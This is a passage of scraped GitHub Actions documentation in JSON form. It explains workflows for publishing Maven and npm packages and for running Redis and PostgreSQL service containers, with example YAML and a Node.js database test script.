        "text": "With this configuration, you can create a workflow that publishes your package to GitHub Packages by making use of the automatically generatedsettings.xml."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish package to GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Publish package\n        run: mvn --batch-mode deploy\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "This workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out a copy of project's repository.",
          "Sets up the Java JDK, and also automatically configures the Mavensettings.xmlfile to add authentication for thegithubMaven repository to use theGITHUB_TOKENenvironment variable.",
          "Runs themvn --batch-mode deploycommand to publish to GitHub Packages. TheGITHUB_TOKENenvironment variable will be set with the contents of theGITHUB_TOKENsecret. Thepermissionskey specifies the access granted to theGITHUB_TOKEN.For more information about using secrets in your workflow, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to the Maven Central Repository and GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "You can publish your packages to both the Maven Central Repository and GitHub Packages by using thesetup-javaaction for each registry."
      },
      {
        "type": "paragraph",
        "text": "Ensure yourpom.xmlfile includes a distribution management repository for both your GitHub repository and your Maven Central Repository provider. For example, if you deploy to the Central Repository through the OSSRH hosting project, you might want to specify it in a distribution management repository with theidset toossrh, and you might want to specify GitHub Packages in a distribution management repository with theidset togithub."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish package to the Maven Central Repository and GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Java for publishing to Maven Central Repository\n        uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n          server-id: ossrh\n          server-username: MAVEN_USERNAME\n          server-password: MAVEN_PASSWORD\n      - name: Publish to the Maven Central Repository\n        run: mvn --batch-mode deploy\n        env:\n          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}\n          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}\n      - name: Set up Java for publishing to GitHub Packages\n        uses: actions/setup-java@v4\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Publish to GitHub Packages\n        run: mvn --batch-mode deploy\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "This workflow calls thesetup-javaaction twice. Each time thesetup-javaaction runs, it overwrites the Mavensettings.xmlfile for publishing packages. For authentication to the repository, thesettings.xmlfile references the distribution management repositoryid, and the username and password."
      },
      {
        "type": "paragraph",
        "text": "This workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out a copy of project's repository.",
          "Callssetup-javathe first time. This configures the Mavensettings.xmlfile for theossrhrepository, and sets the authentication options to environment variables that are defined in the next step.",
          "Runs themvn --batch-mode deploycommand to publish to theossrhrepository. TheMAVEN_USERNAMEenvironment variable will be set with the contents of yourOSSRH_USERNAMEsecret, and theMAVEN_PASSWORDenvironment variable will be set with the contents of yourOSSRH_TOKENsecret.",
          "Callssetup-javathe second time. This automatically configures the Mavensettings.xmlfile for GitHub Packages.",
          "Runs themvn --batch-mode deploycommand to publish to GitHub Packages. TheGITHUB_TOKENenvironment variable will be set with the contents of theGITHUB_TOKENsecret. Thepermissionskey specifies the access granted to theGITHUB_TOKEN.For more information about using secrets in your workflow, seeUsing secrets in GitHub Actions."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that publishes Node.js packages to the GitHub Packages and npm registries after continuous integration (CI) tests pass."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of workflow configuration options and how to create a workflow file. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "For more information about creating a CI workflow for your Node.js project, seeBuilding and testing Node.js."
      },
      {
        "type": "paragraph",
        "text": "You may also find it helpful to have a basic understanding of the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Working with the npm registry",
          "Store information in variables",
          "Using secrets in GitHub Actions",
          "Automatic token authentication"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About package configuration"
      },
      {
        "type": "paragraph",
        "text": "Thenameandversionfields in thepackage.jsonfile create a unique identifier that registries use to link your package to a registry. You can add a summary for the package listing page by including adescriptionfield in thepackage.jsonfile. For more information, seeCreating a package.json fileandCreating Node.js modulesin the npm documentation."
      },
      {
        "type": "paragraph",
        "text": "When a local.npmrcfile exists and has aregistryvalue specified, thenpm publishcommand uses the registry configured in the.npmrcfile. You can use thesetup-nodeaction to create a local.npmrcfile on the runner that configures the default registry and scope. Thesetup-nodeaction also accepts an authentication token as input, used to access private registries or publish node packages. For more information, seesetup-node."
      },
      {
        "type": "paragraph",
        "text": "You can specify the Node.js version installed on the runner using thesetup-nodeaction."
      },
      {
        "type": "paragraph",
        "text": "If you add steps in your workflow to configure thepublishConfigfields in yourpackage.jsonfile, you don't need to specify the registry-url using thesetup-nodeaction, but you will be limited to publishing the package to one registry. For more information, seepublishConfigin the npm documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to the npm registry"
      },
      {
        "type": "paragraph",
        "text": "You can trigger a workflow to publish your package every time you publish a new release. The process in the following example is executed when the release event of typepublishedis triggered. If the CI tests pass, the process uploads the package to the npm registry. For more information, seeManaging releases in a repository."
      },
      {
        "type": "paragraph",
        "text": "To perform authenticated operations against the npm registry in your workflow, you'll need to store your npm authentication token as a secret. For example, create a repository secret calledNPM_TOKEN. For more information, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "By default, npm uses thenamefield of thepackage.jsonfile to determine the name of your published package. When publishing to a global namespace, you only need to include the package name. For example, you would publish a package namedmy-packagetohttps://www.npmjs.com/package/my-package."
      },
      {
        "type": "paragraph",
        "text": "If you're publishing a package that includes a scope prefix, include the scope in the name of yourpackage.jsonfile. For example, if your npm scope prefix is \"octocat\" and the package name is \"hello-world\", thenamein yourpackage.jsonfile should be@octocat/hello-world. If your npm package uses a scope prefix and the package is public, you need to use the optionnpm publish --access public. This is an option that npm requires to prevent someone from publishing a private package unintentionally."
      },
      {
        "type": "paragraph",
        "text": "If you would like to publish your package with provenance, include the--provenanceflag with yournpm publishcommand. This allows you to publicly and verifiably establish where and how your package was built, which increases supply chain security for people who consume your package. For more information, seeGenerating provenance statementsin the npm documentation."
      },
      {
        "type": "paragraph",
        "text": "This example stores theNPM_TOKENsecret in theNODE_AUTH_TOKENenvironment variable. When thesetup-nodeaction creates an.npmrcfile, it references the token from theNODE_AUTH_TOKENenvironment variable."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish Package to npmjs\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@v4\n      # Setup .npmrc file to publish to npm\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20.x'\n          registry-url: 'https://registry.npmjs.org'\n      - run: npm ci\n      - run: npm publish --provenance --access public\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "In the example above, thesetup-nodeaction creates an.npmrcfile on the runner with the following contents:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\nregistry=https://registry.npmjs.org/\nalways-auth=true"
      },
      {
        "type": "paragraph",
        "text": "Please note that you need to set theregistry-urltohttps://registry.npmjs.org/insetup-nodeto properly configure your credentials."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages to GitHub Packages"
      },
      {
        "type": "paragraph",
        "text": "You can trigger a workflow to publish your package every time you publish a new release. The process in the following example is executed when the release event of typepublishedis triggered. If the CI tests pass, the process uploads the package to GitHub Packages. For more information, seeManaging releases in a repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the destination repository"
      },
      {
        "type": "paragraph",
        "text": "Linking your package to GitHub Packages using therepositorykey is optional. If you choose not to provide therepositorykey in yourpackage.jsonfile, then your package will not be linked to a repository when it is published, but you can choose to connect the package to a repository later."
      },
      {
        "type": "paragraph",
        "text": "If you do provide therepositorykey in yourpackage.jsonfile, then the repository in that key is used as the destination npm registry for GitHub Packages. For example, publishing the belowpackage.jsonresults in a package namedmy-packagepublished to theoctocat/my-other-repoGitHub repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"name\": \"@octocat/my-package\",\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/octocat/my-other-repo.git\"\n  },"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Authenticating to the destination repository"
      },
      {
        "type": "paragraph",
        "text": "To perform authenticated operations against the GitHub Packages registry in your workflow, you can use theGITHUB_TOKEN. TheGITHUB_TOKENsecret is set to an access token for the repository each time a job in a workflow begins. You should set the permissions for this access token in the workflow file to grant read access for thecontentspermission and write access for thepackagespermission. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "If you want to publish your package to a different repository, you must use a personal access token (classic) that has permission to write to packages in the destination repository. For more information, seeManaging your personal access tokensandUsing secrets in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example workflow"
      },
      {
        "type": "paragraph",
        "text": "This example stores theGITHUB_TOKENsecret in theNODE_AUTH_TOKENenvironment variable. When thesetup-nodeaction creates an.npmrcfile, it references the token from theNODE_AUTH_TOKENenvironment variable."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish package to GitHub Packages\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      # Setup .npmrc file to publish to GitHub Packages\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20.x'\n          registry-url: 'https://npm.pkg.github.com'\n          # Defaults to the user or organization that owns the workflow file\n          scope: '@octocat'\n      - run: npm ci\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "Thesetup-nodeaction creates an.npmrcfile on the runner. When you use thescopeinput to thesetup-nodeaction, the.npmrcfile includes the scope prefix. By default, thesetup-nodeaction sets the scope in the.npmrcfile to the account that contains that workflow file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}\n@octocat:registry=https://npm.pkg.github.com\nalways-auth=true"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing packages using Yarn"
      },
      {
        "type": "paragraph",
        "text": "If you use the Yarn package manager, you can install and publish packages using Yarn."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish Package to npmjs\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      # Setup .npmrc file to publish to npm\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20.x'\n          registry-url: 'https://registry.npmjs.org'\n          # Defaults to the user or organization that owns the workflow file\n          scope: '@octocat'\n      - run: yarn\n      - run: yarn npm publish // for Yarn version 1, use `yarn publish` instead\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "To authenticate with the registry during publishing, ensure your authentication token is also defined in youryarnrc.ymlfile. For more information, see theSettingsarticle in the Yarn documentation."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About service containers"
      },
      {
        "type": "paragraph",
        "text": "Service containers are Docker containers that provide a simple and portable way for you to host services that you might need to test or operate your application in a workflow. For example, your workflow might need to run integration tests that require access to a database and memory cache."
      },
      {
        "type": "paragraph",
        "text": "You can configure service containers for each job in a workflow. GitHub creates a fresh Docker container for each service configured in the workflow, and destroys the service container when the job completes. Steps in a job can communicate with all service containers that are part of the same job. However, you cannot create and use service containers inside a composite action."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your workflows use Docker container actions, job containers, or service containers, then you must use a Linux runner:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you are using GitHub-hosted runners, you must use an Ubuntu runner.",
          "If you are using self-hosted runners, you must use a Linux machine as your runner and Docker must be installed."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Communicating with service containers"
      },
      {
        "type": "paragraph",
        "text": "You can configure jobs in a workflow to run directly on a runner machine or in a Docker container. Communication between a job and its service containers is different depending on whether a job runs directly on the runner machine or in a container."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running jobs in a container"
      },
      {
        "type": "paragraph",
        "text": "When you run jobs in a container, GitHub connects service containers to the job using Docker's user-defined bridge networks. For more information, seeBridge network driverin the Docker documentation."
      },
      {
        "type": "paragraph",
        "text": "Running the job and services in a container simplifies network access. You can access a service container using the label you configure in the workflow. The hostname of the service container is automatically mapped to the label name. For example, if you create a service container with the labelredis, the hostname of the service container isredis."
      },
      {
        "type": "paragraph",
        "text": "You don't need to configure any ports for service containers. By default, all containers that are part of the same Docker network expose all ports to each other, and no ports are exposed outside of the Docker network."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running jobs on the runner machine"
      },
      {
        "type": "paragraph",
        "text": "When running jobs directly on the runner machine, you can access service containers usinglocalhost:<port>or127.0.0.1:<port>. GitHub configures the container network to enable communication from the service container to the Docker host."
      },
      {
        "type": "paragraph",
        "text": "When a job runs directly on a runner machine, the service running in the Docker container does not expose its ports to the job on the runner by default. You need to map ports on the service container to the Docker host. For more information, seeAbout service containers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating service containers"
      },
      {
        "type": "paragraph",
        "text": "You can use theserviceskeyword to create service containers that are part of a job in your workflow. For more information, seejobs.<job_id>.services."
      },
      {
        "type": "paragraph",
        "text": "This example creates a service calledredisin a job calledcontainer-job. The Docker host in this example is thenode:16-bullseyecontainer."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Redis container example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:16-bullseye\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Mapping Docker host and service container ports"
      },
      {
        "type": "paragraph",
        "text": "If your job runs in a Docker container, you do not need to map ports on the host or the service container. If your job runs directly on the runner machine, you'll need to map any required service container ports to ports on the host runner machine."
      },
      {
        "type": "paragraph",
        "text": "You can map service containers ports to the Docker host using theportskeyword. For more information, seejobs.<job_id>.services."
      },
      {
        "type": "paragraph",
        "text": "When you map ports using theportskeyword, GitHub uses the--publishcommand to publish the container’s ports to the Docker host. For more information, seeDocker container networkingin the Docker documentation."
      },
      {
        "type": "paragraph",
        "text": "When you specify the container port but not the Docker host port, the container port is randomly assigned to a free port. GitHub sets the assigned container port in the service container context. For example, for aredisservice container, if you configured the Docker host port 5432, you can access the corresponding container port using thejob.services.redis.ports[5432]context. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example mapping Redis ports"
      },
      {
        "type": "paragraph",
        "text": "This example maps the service containerredisport 6379 to the Docker host port 6379."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Redis Service Example\non: push\n\njobs:\n  # Label of the container job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        #\n        ports:\n          # Opens tcp port 6379 on the host and service container\n          - 6379:6379"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Authenticating with image registries"
      },
      {
        "type": "paragraph",
        "text": "You can specify credentials for your service containers in case you need to authenticate with an image registry. This allows you to use images from private registries or toincrease your DockerHub rate limit."
      },
      {
        "type": "paragraph",
        "text": "Here’s an example of authenticating with Docker Hub and the GitHub Container registry:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build:\n    services:\n      redis:\n        # Docker Hub image\n        image: redis\n        ports:\n          - 6379:6379\n        credentials:\n          username: ${{ secrets.dockerhub_username }}\n          password: ${{ secrets.dockerhub_password }}\n      db:\n        # Private registry image\n        image: ghcr.io/octocat/testdb:latest\n        credentials:\n          username: ${{ github.repository_owner }}\n          password: ${{ secrets.ghcr_password }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Creating Redis service containers",
          "Creating PostgreSQL service containers"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you workflow examples that configure a service container using the Docker Hubpostgresimage. The workflow runs a script that connects to the PostgreSQL service, creates a table, and then populates it with data. To test that the workflow creates and populates the PostgreSQL table, the script prints the data from the table to the console."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your workflows use Docker container actions, job containers, or service containers, then you must use a Linux runner:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you are using GitHub-hosted runners, you must use an Ubuntu runner.",
          "If you are using self-hosted runners, you must use a Linux machine as your runner and Docker must be installed."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with how service containers work with GitHub Actions and the networking differences between running jobs directly on the runner or in a container. For more information, seeAbout service containers."
      },
      {
        "type": "paragraph",
        "text": "You may also find it helpful to have a basic understanding of YAML, the syntax for GitHub Actions, and PostgreSQL. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Writing workflows",
          "PostgreSQL tutorialin the PostgreSQL documentation"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Running jobs in containers"
      },
      {
        "type": "paragraph",
        "text": "Configuring jobs to run in a container simplifies networking configurations between the job and the service containers. Docker containers on the same user-defined bridge network expose all ports to each other, so you don't need to map any of the service container ports to the Docker host. You can access the service container from the job container using the label you configure in the workflow."
      },
      {
        "type": "paragraph",
        "text": "You can copy this workflow file to the.github/workflowsdirectory of your repository and modify it as needed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: PostgreSQL service example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: actions/checkout@v4\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL table, populates\n        # the table with data, and then retrieves the data.\n        run: node client.js\n        # Environment variables used by the `client.js` script to create a new PostgreSQL table.\n        env:\n          # The hostname used to communicate with the PostgreSQL service container\n          POSTGRES_HOST: postgres\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the runner job for jobs in containers"
      },
      {
        "type": "paragraph",
        "text": "This workflow configures a job that runs in thenode:20-bookworm-slimcontainer and uses theubuntu-latestGitHub-hosted runner as the Docker host for the container. For more information about thenode:20-bookworm-slimcontainer, see thenode imageon Docker Hub."
      },
      {
        "type": "paragraph",
        "text": "The workflow configures a service container with the labelpostgres. All services must run in a container, so each service requires that you specify the containerimage. This example uses thepostgrescontainer image, provides the default PostgreSQL password, and includes health check options to make sure the service is running. For more information, see thepostgres imageon Docker Hub."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the steps for jobs in containers"
      },
      {
        "type": "paragraph",
        "text": "The workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out the repository on the runner",
          "Installs dependencies",
          "Runs a script to create a client"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: actions/checkout@v4\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to PostgreSQL\n    # Runs a script that creates a PostgreSQL table, populates\n    # the table with data, and then retrieves the data.\n    run: node client.js\n    # Environment variable used by the `client.js` script to create\n    # a new PostgreSQL client.\n    env:\n      # The hostname used to communicate with the PostgreSQL service container\n      POSTGRES_HOST: postgres\n      # The default PostgreSQL port\n      POSTGRES_PORT: 5432"
      },
      {
        "type": "paragraph",
        "text": "Theclient.jsscript looks for thePOSTGRES_HOSTandPOSTGRES_PORTenvironment variables to create the client. The workflow sets those two environment variables as part of the \"Connect to PostgreSQL\" step to make them available to theclient.jsscript. For more information about the script, seeTesting the PostgreSQL service container."
      },
      {
        "type": "paragraph",
        "text": "The hostname of the PostgreSQL service is the label you configured in your workflow, in this case,postgres. Because Docker containers on the same user-defined bridge network open all ports by default, you'll be able to access the service container on the default PostgreSQL port 5432."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Running jobs directly on the runner machine"
      },
      {
        "type": "paragraph",
        "text": "When you run a job directly on the runner machine, you'll need to map the ports on the service container to ports on the Docker host. You can access service containers from the Docker host usinglocalhostand the Docker host port number."
      },
      {
        "type": "paragraph",
        "text": "You can copy this workflow file to the.github/workflowsdirectory of your repository and modify it as needed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: PostgreSQL Service Example\non: push\n\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps tcp port 5432 on service container to the host\n          - 5432:5432\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: actions/checkout@v4\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL table, populates\n        # the table with data, and then retrieves the data\n        run: node client.js\n        # Environment variables used by the `client.js` script to create\n        # a new PostgreSQL table.\n        env:\n          # The hostname used to communicate with the PostgreSQL service container\n          POSTGRES_HOST: localhost\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the runner job for jobs directly on the runner machine"
      },
      {
        "type": "paragraph",
        "text": "The example uses theubuntu-latestGitHub-hosted runner as the Docker host."
      },
      {
        "type": "paragraph",
        "text": "The workflow configures a service container with the labelpostgres. All services must run in a container, so each service requires that you specify the containerimage. This example uses thepostgrescontainer image, provides the default PostgreSQL password, and includes health check options to make sure the service is running. For more information, see thepostgres imageon Docker Hub."
      },
      {
        "type": "paragraph",
        "text": "The workflow maps port 5432 on the PostgreSQL service container to the Docker host. For more information about theportskeyword, seeAbout service containers."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps tcp port 5432 on service container to the host\n          - 5432:5432"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the steps for jobs directly on the runner machine"
      },
      {
        "type": "paragraph",
        "text": "The workflow performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Checks out the repository on the runner",
          "Installs dependencies",
          "Runs a script to create a client"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: actions/checkout@v4\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to PostgreSQL\n    # Runs a script that creates a PostgreSQL table, populates\n    # the table with data, and then retrieves the data\n    run: node client.js\n    # Environment variables used by the `client.js` script to create\n    # a new PostgreSQL table.\n    env:\n      # The hostname used to communicate with the PostgreSQL service container\n      POSTGRES_HOST: localhost\n      # The default PostgreSQL port\n      POSTGRES_PORT: 5432"
      },
      {
        "type": "paragraph",
        "text": "Theclient.jsscript looks for thePOSTGRES_HOSTandPOSTGRES_PORTenvironment variables to create the client. The workflow sets those two environment variables as part of the \"Connect to PostgreSQL\" step to make them available to theclient.jsscript. For more information about the script, seeTesting the PostgreSQL service container."
      },
      {
        "type": "paragraph",
        "text": "The hostname islocalhostor127.0.0.1."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing the PostgreSQL service container"
      },
      {
        "type": "paragraph",
        "text": "You can test your workflow using the following script, which connects to the PostgreSQL service and adds a new table with some placeholder data. The script then prints the values stored in the PostgreSQL table to the terminal. Your script can use any language you'd like, but this example uses Node.js and thepgnpm module. For more information, see thenpm pg module."
      },
      {
        "type": "paragraph",
        "text": "You can modifyclient.jsto include any PostgreSQL operations needed by your workflow. In this example, the script connects to the PostgreSQL service, adds a table to thepostgresdatabase, inserts some placeholder data, and then retrieves the data."
      },
      {
        "type": "paragraph",
        "text": "Add a new file calledclient.jsto your repository with the following code."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "const { Client } = require('pg');\n\nconst pgclient = new Client({\n    host: process.env.POSTGRES_HOST,\n    port: process.env.POSTGRES_PORT,\n    user: 'postgres',\n    password: 'postgres',\n    database: 'postgres'\n});\n\npgclient.connect();\n\nconst table = 'CREATE TABLE student(id SERIAL PRIMARY KEY, firstName VARCHAR(40) NOT NULL, lastName VARCHAR(40) NOT NULL, age INT, address VARCHAR(80), email VARCHAR(40))'\nconst text = 'INSERT INTO student(firstname, lastname, age, address, email) VALUES($1, $2, $3, $4, $5) RETURNING *'\nconst values = ['Mona the', 'Octocat', 9, '88 Colin P Kelly Jr St, San Francisco, CA 94107, United States', 'octocat@github.com']\n\npgclient.query(table, (err, res) => {\n    if (err) throw err\n});\n\npgclient.query(text, values, (err, res) => {\n    if (err) throw err\n});\n\npgclient.query('SELECT * FROM student', (err, res) => {\n    if (err) throw err\n    console.log(err, res.rows) // Print the data in student table\n    pgclient.end()\n});"
      },
      {
        "type": "paragraph",
        "text": "The script creates a new connection to the PostgreSQL service, and uses thePOSTGRES_HOSTandPOSTGRES_PORTenvironment variables to specify the PostgreSQL service IP address and port. Ifhostandportare not defined, the default host islocalhostand the default port is 5432."
      },
      {
        "type": "paragraph",
        "text": "The script creates a table and populates it with placeholder data. To test that thepostgresdatabase contains the data, the script prints the contents of the table to the console log."
      },
      {
        "type": "paragraph",
        "text": "When you run this workflow, you should see the following output in the \"Connect to PostgreSQL\" step, which confirms that you successfully created the PostgreSQL table and added data:"
      },
      {
        "type": "code",
        "language": "yaml",
